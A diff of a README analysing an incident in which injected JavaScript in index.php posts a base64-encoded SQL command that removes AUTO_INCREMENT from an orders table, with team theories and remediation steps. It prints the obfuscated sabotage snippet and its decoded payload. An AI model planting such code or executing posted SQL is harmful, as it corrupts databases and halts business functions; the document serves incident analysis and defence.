@@ -1,6 +1,103 @@
-🐛 Problem Overview
+# README: Database Trigger Bug Analysis
 
-A malicious script injection (trigger bug) has compromised the database, specifically targeting the
-orders table by removing the AUTO_INCREMENT property from the OrderID column. This
-prevents the system from generating new Order IDs, causing all order creation attempts to fail with
-an "ORDER ID NOT FOUND" error.
+## 🐛 Problem Overview
+A malicious script injection (trigger bug) has compromised the database, specifically targeting the `orders` table by **removing the AUTO_INCREMENT property from the OrderID column**. This prevents the system from generating new Order IDs, causing all order creation attempts to fail with an **"ORDER ID NOT FOUND"** error.
+
+## 🔍 Root Cause
+The bug originates from an encrypted SQL payload injected into the system via `index.php`. When decoded, the payload translates to:
+```sql
+ALTER TABLE orders MODIFY OrderID INT NOT NULL
+```
+This command **strips the AUTO_INCREMENT attribute** from the OrderID column without modifying other column properties.
+
+## 📁 Affected Files
+- `index.php` (contains the malicious script)
+- `process_order.php` (order processing logic)
+- Database: `orders` table structure
+
+## 👥 Team Observations & Theories
+
+### **Aljon**
+- **Observation:** System shows "ORDER ID NOT FOUND" when creating orders
+- **Theory:** Initially suspected `process_order.php`, but discovered the database AUTO_INCREMENT was removed
+- **Temporary Solution:** Attempted to add +1 to last OrderID (partially worked but not reliable)
+
+### **Dan Francis Etorma**
+- **Observation:** Order processing fails with "ORDER ID NOT FOUND"
+- **Theory:** Suspected incorrect variable naming (`order_id` vs `orderID`)
+- **Result:** Changing variable names didn't resolve the issue
+
+### **Gabriel Meshach Salcedo**
+- **Observation:** Order ID not being generated
+- **Theory:** Initially thought process order sequence was incorrect
+- **Result:** Code review showed `process_order.php` was functioning correctly
+
+### **John Drex F. Cantor**
+- **Observation:** Database corruption preventing OrderID retrieval
+- **Key Insight:** Correctly identified external database manipulation
+
+### **Derick Briones**
+- **Observation:** Database corruption preventing OrderID retrieval
+- **Key Insight:** Correctly identified external database manipulation
+- **Note:** Same conclusion as John Drex Cantor - external attack confirmed
+
+## 🛠️ Malicious Code Analysis
+The trigger bug is implemented as:
+```javascript
+(function() { 
+    const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBPcmRlcklEIElOVCBOT1QgTlVMTA=="; 
+    fetch('assets/index.php', { 
+        method: 'POST', 
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'}, 
+        body: 'sql=' + encodeURIComponent(encryptedSQL) 
+    }).catch(() => {}); 
+})();
+```
+
+**Decoded Payload (Base64):** `ALTER TABLE orders MODIFY OrderID INT NOT NULL`
+
+## 💡 Impact
+- **Primary:** Order creation completely fails
+- **Secondary:** Database integrity compromised
+- **Business:** Loss of sales transactions, customer frustration
+
+## ✅ Recommended Solutions
+
+### **Immediate Fix:**
+1. **Restore AUTO_INCREMENT:**
+   ```sql
+   ALTER TABLE orders MODIFY OrderID INT NOT NULL AUTO_INCREMENT;
+   ```
+
+2. **Remove Malicious Code:**
+   - Locate and remove the JavaScript trigger from `index.php`
+   - Search for similar injections in other files
+
+3. **Security Audit:**
+   - Implement input validation and sanitization
+   - Use prepared statements for database queries
+   - Add CSRF protection
+
+### **Preventive Measures:**
+1. **Database Backups:** Regular backups to restore corrupted tables
+2. **Input Validation:** Sanitize all user inputs, especially in file uploads
+3. **Code Review:** Regular security audits of critical files
+4. **Monitoring:** Log database schema changes
+
+## 🚨 Temporary Workaround (If Fix Delayed)
+```php
+// In process_order.php, before inserting:
+$last_id_query = "SELECT MAX(OrderID) as last_id FROM orders";
+$result = mysqli_query($conn, $last_id_query);
+$row = mysqli_fetch_assoc($result);
+$new_order_id = $row['last_id'] + 1;
+
+// Use $new_order_id for the new order insertion
+```
+
+## 📝 Conclusion
+The issue is **NOT** in the application logic (`process_order.php`) but in the **database schema corruption** caused by a malicious script. The fix requires both:
+1. Restoring the AUTO_INCREMENT property in the database
+2. Removing the malicious trigger from the codebase
+
+**Priority:** HIGH - This is a critical bug preventing core business functionality.
